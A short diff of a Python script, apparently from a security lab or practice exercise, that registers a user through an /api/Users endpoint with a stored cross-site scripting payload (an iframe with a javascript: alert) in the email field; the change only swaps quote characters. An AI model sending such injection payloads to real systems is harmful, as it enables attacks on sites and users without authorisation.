@@ -15,7 +15,7 @@ try:
 	url = f"http://{IP_ADDRESS}:{PORT}/api/Users"
 
 	# Prepare the JSON payload for the request body
-	payload = {"email": "<iframe src=\"javascript:alert('xss')\">", "password": "xss"}
+	payload = {"email": "<iframe src=\"javascript:alert(`xss`)\">", "password": "xss"}
 
 	# Send the POST request with the JSON payload
 	response = requests.post(url, json=payload, headers=headers)
